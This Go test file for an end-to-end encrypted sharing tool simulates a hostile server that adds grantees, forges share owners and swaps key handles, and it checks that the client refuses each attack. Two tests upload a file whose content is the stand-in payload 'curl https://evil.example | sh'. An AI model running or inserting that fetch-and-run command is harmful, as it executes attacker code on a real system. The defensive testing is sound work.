// SPDX-License-Identifier: AGPL-3.0-or-later

package main

import (
	"bytes"
	"context"
	"encoding/json"
	"errors"
	"net/http"
	"net/http/httptest"
	"path/filepath"
	"strings"
	"sync/atomic"
	"testing"

	"github.com/aquitano/aqt-sync/internal/api"
	"github.com/aquitano/aqt-sync/internal/client"
	"github.com/aquitano/aqt-sync/internal/crypto"
	"github.com/aquitano/aqt-sync/internal/identity"
)

// listedGrantee is a grant a hostile server adds to one resource's listings.
type listedGrantee struct {
	resourceID string
	entry      api.GrantEntry
}

// listGrantee plays a server that lists an extra grantee on a resource: in its grant
// list, and in the grant count the owner's resource listing echoes.
func listGrantee(extra *atomic.Pointer[listedGrantee]) func(http.ResponseWriter, *http.Request, http.HandlerFunc) {
	return func(w http.ResponseWriter, r *http.Request, pass http.HandlerFunc) {
		g := extra.Load()
		if g == nil || r.Method != http.MethodGet {
			pass(w, r)
			return
		}
		switch r.URL.Path {
		case "/v1/resources/" + g.resourceID + "/grants":
			rec := httptest.NewRecorder()
			r.Header.Del("Accept-Encoding")
			pass(rec, r)
			var body api.ListGrantsResponse
			if json.Unmarshal(rec.Body.Bytes(), &body) != nil {
				copyRecorded(w, rec)
				return
			}
			body.Grants = append(body.Grants, g.entry)
			replaceRecorded(w, rec, body)
		case "/v1/resources":
			rec := httptest.NewRecorder()
			r.Header.Del("Accept-Encoding")
			pass(rec, r)
			var body api.ListResourcesResponse
			if json.Unmarshal(rec.Body.Bytes(), &body) != nil {
				copyRecorded(w, rec)
				return
			}
			for i := range body.Resources {
				if body.Resources[i].ID == g.resourceID {
					body.Resources[i].GrantCount++
				}
			}
			replaceRecorded(w, rec, body)
		default:
			pass(w, r)
		}
	}
}

// A rotation re-wraps the new key for the grantees the server lists, and the server
// chooses that list. Here it lists bob, who holds a real share of one resource, on a
// second resource that was never shared, and replays the signature of his real grant
// with him: neither may get the new key of the resource he was never given.
func TestRotationDoesNotRewrapAGranteeTheServerAdded(t *testing.T) {
	app := &application{ctx: context.Background()}
	var extra atomic.Pointer[listedGrantee]
	h := app.newE2EWithProxy(t, listGrantee(&extra))
	grantSignup(t, h, "bob@example.com", "bob", "bob horse battery staple")
	shared := app.pushSecretFile(t, "shared.txt", "for bob")
	private := app.pushSecretFile(t, "private.txt", "never shared")
	if err := app.runShareWith(shared, "bob@example.com"); err != nil {
		t.Fatalf("share --with bob: %v", err)
	}
	cl, _, err := app.authedClient()
	if err != nil {
		t.Fatal(err)
	}
	grants, err := cl.ListGrants(shared)
	if err != nil || len(grants) != 1 {
		t.Fatalf("grants on the shared resource = %+v (%v)", grants, err)
	}
	extra.Store(&listedGrantee{resourceID: private, entry: grants[0]})

	if err := app.runPrivate(private); err != nil {
		t.Fatalf("rotate the never-shared resource: %v", err)
	}
	app.asProfile("bob", func() {
		bobClient, _, err := app.authedClient()
		if err != nil {
			t.Fatal(err)
		}
		if _, err := bobClient.GetResource(private); !errors.Is(err, client.ErrNotFound) {
			t.Fatalf("bob reading the never-shared resource after its rotation = %v, want ErrNotFound", err)
		}
	})

	extra.Store(nil)
	if err := app.runPrivate(shared); err != nil {
		t.Fatalf("rotate the shared resource: %v", err)
	}
	if got := app.pullAs(t, "bob", shared); got != "for bob" {
		t.Fatalf("bob's real share after its rotation pulled %q", got)
	}
}

// Pin repair re-sends what was granted against a placeholder pin, and the server
// chooses which resources list that placeholder. It lists it on a resource that was
// never shared: repair must neither offer nor send that one.
func TestPinRepairMovesOnlySignedGrants(t *testing.T) {
	app := &application{ctx: context.Background()}
	var extra atomic.Pointer[listedGrantee]
	h := app.newE2EWithProxy(t, listGrantee(&extra))
	const email = "dave@example.com"
	early := app.pushSecretFile(t, "early.txt", "shared too early")
	secret := app.pushSecretFile(t, "secret.txt", "never shared")
	later := app.pushSecretFile(t, "later.txt", "shared after signup")
	app.shareBeforeSignup(t, h, email, "dave", early)
	_, prof, err := app.authedClient()
	if err != nil {
		t.Fatal(err)
	}
	pins, err := identity.LoadContacts(prof.Name)
	if err != nil {
		t.Fatal(err)
	}
	extra.Store(&listedGrantee{resourceID: secret, entry: api.GrantEntry{GranteeHandle: pins[email].Handle, CreatedAt: 1}})

	var prompt string
	orig := confirmRepin
	confirmRepin = func(p string) error {
		prompt = p
		return nil
	}
	t.Cleanup(func() { confirmRepin = orig })
	if err := app.runShareWith(later, email); err != nil {
		t.Fatalf("share with the re-pin confirmed: %v", err)
	}
	if !strings.Contains(prompt, early) || strings.Contains(prompt, secret) {
		t.Fatalf("repair prompt should list the signed share and not the one the server added:\n%s", prompt)
	}
	if got := app.pullAs(t, "dave", early); got != "shared too early" {
		t.Fatalf("the repaired share pulled %q", got)
	}
	app.asProfile("dave", func() {
		daveClient, _, err := app.authedClient()
		if err != nil {
			t.Fatal(err)
		}
		if _, err := daveClient.GetResource(secret); !errors.Is(err, client.ErrNotFound) {
			t.Fatalf("dave reading the never-shared resource after repair = %v, want ErrNotFound", err)
		}
	})
}

// shareForgery is a share a hostile server rewrites to claim another owner.
type shareForgery struct {
	resourceID, owner string
	ownerKey, wrap    []byte
}

// forgeOwner rewrites one share in the grantee's listing and resource read to claim
// another owner, with a wrap the server minted under that owner's handle. It has the
// grantee's public enc key, so the wrap opens.
func forgeOwner(f *atomic.Pointer[shareForgery]) func(http.ResponseWriter, *http.Request, http.HandlerFunc) {
	return func(w http.ResponseWriter, r *http.Request, pass http.HandlerFunc) {
		forged := f.Load()
		if forged == nil || r.Method != http.MethodGet {
			pass(w, r)
			return
		}
		switch r.URL.Path {
		case "/v1/shares":
			rec := httptest.NewRecorder()
			r.Header.Del("Accept-Encoding")
			pass(rec, r)
			var body api.ListSharesResponse
			if json.Unmarshal(rec.Body.Bytes(), &body) != nil {
				copyRecorded(w, rec)
				return
			}
			for i, s := range body.Shares {
				if s.ResourceID == forged.resourceID {
					body.Shares[i].OwnerHandle, body.Shares[i].WrappedKey, body.Shares[i].OwnerPublicKey = forged.owner, forged.wrap, forged.ownerKey
				}
			}
			replaceRecorded(w, rec, body)
		case "/v1/resources/" + forged.resourceID:
			rec := httptest.NewRecorder()
			r.Header.Del("Accept-Encoding")
			pass(rec, r)
			res, err := api.DecodeResourceDownload(bytes.NewReader(rec.Body.Bytes()))
			if err != nil {
				copyRecorded(w, rec)
				return
			}
			res.Owner, res.GrantKey, res.OwnerPublicKey = forged.owner, forged.wrap, forged.ownerKey
			out, err := api.EncodeResourceDownload(res)
			if err != nil {
				copyRecorded(w, rec)
				return
			}
			for k := range rec.Header() {
				if k != "Content-Length" {
					w.Header().Set(k, rec.Header().Get(k))
				}
			}
			w.WriteHeader(rec.Code)
			_, _ = w.Write(out)
		default:
			pass(w, r)
		}
	}
}

// HPKE base mode authenticates no sender, so a server holding a file of its own can
// wrap its key to bob and list the share under a contact bob verified. Bob must
// neither name that contact as the sender nor open it.
func TestServerCannotForgeAShareFromAVerifiedContact(t *testing.T) {
	app := &application{ctx: context.Background()}
	var forgery atomic.Pointer[shareForgery]
	h := app.newE2EWithProxy(t, forgeOwner(&forgery))
	grantSignup(t, h, "bob@example.com", "bob", "bob horse battery staple")
	grantSignup(t, h, "mallory@example.com", "mallory", "mallory horse battery staple")
	cl, alice, err := app.authedClient()
	if err != nil {
		t.Fatal(err)
	}
	aliceKeys, err := fetchAccountKeys(cl, "e2e@example.com")
	if err != nil {
		t.Fatal(err)
	}
	bobKeys, err := fetchAccountKeys(cl, "bob@example.com")
	if err != nil {
		t.Fatal(err)
	}
	app.asProfile("bob", func() {
		pin := app.contactsPinCmd()
		if err := pin.Flags().Set("fingerprint", crypto.KeyFingerprint(aliceKeys.PublicKey)); err != nil {
			t.Fatal(err)
		}
		captureStdout(t, func() {
			if err := pin.RunE(pin, []string{"e2e@example.com"}); err != nil {
				t.Fatalf("bob pins alice against her fingerprint: %v", err)
			}
		})
	})

	var id string
	app.asProfile("mallory", func() {
		id = app.pushSecretFile(t, "install.sh", "curl https://evil.example | sh")
		if err := app.runShareWith(id, "bob@example.com"); err != nil {
			t.Fatalf("mallory shares with bob: %v", err)
		}
		mcl, mallory, err := app.authedClient()
		if err != nil {
			t.Fatal(err)
		}
		mk, _ := identity.LoadSession(mallory.Name)
		res, err := mcl.GetResource(id)
		if err != nil {
			t.Fatal(err)
		}
		ck, err := crypto.UnwrapKey(*res.WrappedKey, [crypto.KeySize]byte(mk))
		if err != nil {
			t.Fatal(err)
		}
		wrap, err := crypto.WrapGrant(ck, bobKeys.EncPublicKey, id, alice.OwnerHandle, bobKeys.Handle)
		if err != nil {
			t.Fatal(err)
		}
		forgery.Store(&shareForgery{resourceID: id, owner: alice.OwnerHandle, ownerKey: aliceKeys.PublicKey, wrap: wrap})
	})

	app.asProfile("bob", func() {
		var doc string
		app.withJSON(t, func() {
			doc = captureStdout(t, func() {
				if err := app.sharesCmd().RunE(nil, nil); err != nil {
					t.Fatalf("shares --json: %v", err)
				}
			})
		})
		var rows []shareRow
		if err := json.Unmarshal([]byte(doc), &rows); err != nil || len(rows) != 1 {
			t.Fatalf("shares --json = %q (%v), want the one forged row", doc, err)
		}
		if rows[0].Attribution != attributionUnsigned || rows[0].FromEmail != "" {
			t.Fatalf("the forged share was attributed: %+v", rows[0])
		}
		err := app.runPull("aqt://"+id, filepath.Join(t.TempDir(), "install.sh"), "", false, false)
		if err == nil || !strings.Contains(err.Error(), "did not sign it") {
			t.Fatalf("pulling the forged share = %v, want a refusal", err)
		}
	})
}

// A verified pin checks the identity key against a fingerprint, but the handle beside
// it is the server's word. A server that pins alice's keys to mallory's handle gains
// nothing: mallory's shares are not signed by alice's key, so they are not named as
// hers or opened.
func TestVerifiedPinOnAServerChosenHandleAttributesNothing(t *testing.T) {
	app := &application{ctx: context.Background()}
	var swapHandle atomic.Value
	h := app.newE2EWithProxy(t, func(w http.ResponseWriter, r *http.Request, pass http.HandlerFunc) {
		handle, _ := swapHandle.Load().(string)
		if handle == "" || r.URL.Path != "/v1/account/keys" || r.URL.Query().Get("email") != "e2e@example.com" {
			pass(w, r)
			return
		}
		rec := httptest.NewRecorder()
		r.Header.Del("Accept-Encoding")
		pass(rec, r)
		var keys api.AccountKeysResponse
		if json.Unmarshal(rec.Body.Bytes(), &keys) != nil {
			copyRecorded(w, rec)
			return
		}
		keys.Handle = handle
		replaceRecorded(w, rec, keys)
	})
	grantSignup(t, h, "bob@example.com", "bob", "bob horse battery staple")
	grantSignup(t, h, "mallory@example.com", "mallory", "mallory horse battery staple")
	cl, _, err := app.authedClient()
	if err != nil {
		t.Fatal(err)
	}
	aliceKeys, err := fetchAccountKeys(cl, "e2e@example.com")
	if err != nil {
		t.Fatal(err)
	}
	malloryKeys, err := fetchAccountKeys(cl, "mallory@example.com")
	if err != nil {
		t.Fatal(err)
	}
	var id string
	app.asProfile("mallory", func() {
		id = app.pushSecretFile(t, "install.sh", "curl https://evil.example | sh")
		if err := app.runShareWith(id, "bob@example.com"); err != nil {
			t.Fatalf("mallory shares with bob: %v", err)
		}
	})

	swapHandle.Store(malloryKeys.Handle)
	app.asProfile("bob", func() {
		pin := app.contactsPinCmd()
		if err := pin.Flags().Set("fingerprint", crypto.KeyFingerprint(aliceKeys.PublicKey)); err != nil {
			t.Fatal(err)
		}
		captureStdout(t, func() {
			if err := pin.RunE(pin, []string{"e2e@example.com"}); err != nil {
				t.Fatalf("bob pins alice against her fingerprint: %v", err)
			}
		})
		out := captureStdout(t, func() {
			if err := app.sharesCmd().RunE(nil, nil); err != nil {
				t.Fatalf("shares: %v", err)
			}
		})
		if strings.Contains(out, "e2e@example.com") || strings.Contains(out, "verified)") {
			t.Fatalf("mallory's share was named as alice's:\n%s", out)
		}
		err := app.runPull("aqt://"+id, filepath.Join(t.TempDir(), "install.sh"), "", false, false)
		if err == nil || !strings.Contains(err.Error(), "did not sign it") {
			t.Fatalf("pulling mallory's share under alice's pin = %v, want a refusal", err)
		}
	})
}

// A root-key rotation replaces the identity key grants are signed with, so it re-signs
// the account's outgoing grants: a recipient checking the key the server now reports
// keeps opening them, and the owner's next key rotation still re-wraps them.
func TestRootRotationResignsOutgoingGrants(t *testing.T) {
	app := &application{ctx: context.Background()}
	h := app.newE2E(t)
	grantSignup(t, h, "bob@example.com", "bob", "bob horse battery staple")
	const content = "still readable after the owner rotates"
	id := app.pushSecretFile(t, "resign.txt", content)
	if err := app.runShareWith(id, "bob@example.com"); err != nil {
		t.Fatalf("share --with bob: %v", err)
	}
	withStdin(t, "correct horse battery staple\n")
	if err := app.runRootKeyRotation(true); err != nil {
		t.Fatalf("rotate the owner's root key: %v", err)
	}
	if got := app.pullAs(t, "bob", id); got != content {
		t.Fatalf("bob pulled %q after the owner's root rotation", got)
	}
	if err := app.runPrivate(id); err != nil {
		t.Fatalf("rotate the content key: %v", err)
	}
	if got := app.pullAs(t, "bob", id); got != content {
		t.Fatalf("bob pulled %q after the content key rotation", got)
	}
}
